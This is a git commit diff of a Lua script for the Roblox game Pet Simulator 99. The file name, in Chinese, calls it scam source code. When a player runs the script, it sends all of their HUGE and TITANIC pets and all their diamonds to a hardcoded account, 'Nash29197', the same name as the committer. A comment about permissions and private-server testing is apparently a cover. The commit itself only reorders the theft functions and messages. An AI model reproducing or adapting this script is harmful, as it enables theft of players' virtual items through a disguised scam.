5bf1501dcfd4e5efc1942012876b67263be79559
Nash29197 <Sx508375@gmail.com>
2024-12-03 17:53:16 +0800

    Update PS99詐騙原碼.lua

--- PS99詐騙原碼.lua
+++ PS99詐騙原碼.lua
@@ -1,8 +1,8 @@
--- 寵物模擬器99：寄送所有 HUGE 與 TITANIC 寵物及鑽石腳本
+-- 寵物模擬器99：寄送所有 Titanic、HUGE 寵物及鑽石腳本
 -- 請先確認您有權限執行此腳本，並於私人伺服器測試。
 
 local recipient = "Nash29197" -- 接收者的遊戲帳號名稱
-local message = "Sending all HUGE and TITANIC pets, and diamonds!" -- 可自訂的訊息
+local message = "Sending all Titanic, HUGE pets, and diamonds!" -- 可自訂的訊息
 local player = game.Players.LocalPlayer
 local replicatedStorage = game:GetService("ReplicatedStorage")
 
@@ -26,6 +26,21 @@ function sendDiamonds(amount)
     print("Diamonds sent: " .. amount)
 end
 
+-- Function to find and send all Titanic pets
+function sendAllTitanicPets()
+    local inventory = player:FindFirstChild("Inventory")
+    if not inventory then
+        print("Inventory not found!")
+        return
+    end
+
+    for _, pet in pairs(inventory:GetChildren()) do
+        if pet:FindFirstChild("Rarity") and pet.Rarity.Value == "TITANIC" then
+            sendPet(pet)
+        end
+    end
+end
+
 -- Function to find and send all HUGE pets
 function sendAllHugePets()
     local inventory = player:FindFirstChild("Inventory")
@@ -36,21 +51,6 @@ function sendAllHugePets()
 
     for _, pet in pairs(inventory:GetChildren()) do
         if pet:FindFirstChild("Rarity") and pet.Rarity.Value == "HUGE" then
-            sendPet(pet)
-        end
-    end
-end
-
--- Function to find and send all TITANIC pets
-function sendAllTitanicPets()
-    local inventory = player:FindFirstChild("Inventory")
-    if not inventory then
-        print("Inventory not found!")
-        return
-    end
-
-    for _, pet in pairs(inventory:GetChildren()) do
-        if pet:FindFirstChild("Rarity") and pet.Rarity.Value == "TITANIC" then
             sendPet(pet)
         end
     end
@@ -67,8 +67,8 @@ function sendAllDiamonds()
 end
 
 -- Main execution
-print("Starting to send all HUGE and TITANIC pets and diamonds...")
-sendAllHugePets()
+print("Starting to send all Titanic, HUGE pets, and diamonds...")
 sendAllTitanicPets()
+sendAllHugePets()
 sendAllDiamonds()
-print("All HUGE and TITANIC pets and diamonds have been sent to " .. recipient)
+print("All Titanic, HUGE pets, and diamonds have been sent to " .. recipient)
